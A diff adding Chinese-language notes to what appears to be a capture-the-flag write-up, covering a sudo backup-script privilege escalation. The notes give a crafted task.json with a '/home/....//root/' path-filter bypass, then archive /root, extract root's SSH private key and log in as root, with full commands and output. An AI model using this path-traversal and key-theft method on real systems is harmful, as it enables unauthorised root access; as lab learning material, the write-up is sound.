@@ -133,6 +133,8 @@ done // 函数调用，遍历所有从 task.json 里解析出来的路径，如�
 
 /usr/bin/backy "$json_file"
 ```
+##### 对task.json的要求：
+```
 
             用户输入 task.json
                    │
@@ -148,5 +150,84 @@ done // 函数调用，遍历所有从 task.json 里解析出来的路径，如�
                    ▼
           如果全部合法，就调用
          /usr/bin/backy "$json_file"
+```
+#### [3]操作
+```
+vi task.json
+
+{
+	"destination": "/tmp",
+	"multiprocessing": true,
+	"verbose_log": false,
+	"directories_to_archive": [
+		"/home/....//root/"
+	]
+
+}
+```
+##### 选择 "destination": "/tmp" 或者 "/dev/shm"，
+##### 因为这些路径具有可写性和易利用性｜普通用户和非特权进程都可以在那里创建临时文件
+
+
+唯一的例外（很冷门）：
+只有路径最开始是 //，才有可能代表“网络路径”或“特殊命名空间”,如//server/share 在某些系统中可能被解释为一个特殊的网络共享路径
+在安全绕过、路径混淆、过滤绕过中，攻击者可能故意加上 //
+
+表达形式	实际意义
+/home/..../root/	正常路径，目录叫 ....
+/home/....//root     等于/home/..../root
+```
+"exclude": [".*"] //排除所有文件和目录,归档结果为空，没有文件会被打包
+```
+
+```
+martin@code:~/backups$ cp task.json /tmp
+
+martin@code:~/backups$ sudo  /usr/bin/backy.sh task.json
+2025/08/06 15:19:13 🍀 backy 1.2
+2025/08/06 15:19:13 📋 Working with task.json ...
+2025/08/06 15:19:13 💤 Nothing to sync
+2025/08/06 15:19:13 📤 Archiving: [/home/../root]
+2025/08/06 15:19:13 📥 To: /tmp ...
+2025/08/06 15:19:13 📦
+
+
+martin@code:/tmp$ ls
+code_home_.._root_2025_August.tar.bz2  task.json
+
+martin@code:/tmp$ tar -xvf code_home_.._root_2025_August.tar.bz2
+root/.ssh/id_rsa
+
+martin@code:/tmp$ ls
+code_home_.._root_2025_August.tar.bz2  root
+
+martin@code:/tmp$ cd root/.ssh
+martin@code:/tmp/root/.ssh$ ls
+authorized_keys  id_rsa
+
+martin@code:/tmp/root/.ssh$ chmod 600 id_rsa
+martin@code:/tmp/root/.ssh$ ssh -i id_rsa root@10.129.218.25
+root@code:~# ls
+root.txt  scripts
+```
+```
+chmod 600
+- rw-------
+- rw-	所有者可读（r）、可写（w），不可执行（-）
+
+权限位	权限符号	权限值
+r（读）	r	4
+w（写）	w	2
+x（执行）	x	1
+无权限	-	0
+
+ id_rsa 是一个 SSH 私钥文件 
+ -i指定使用的私钥
+
+ root/.ssh/id_rsa             ← 私钥（你拿到的）
+root/.ssh/authorized_keys    ← 公钥（远程主机有）
+
+```
+
 
 
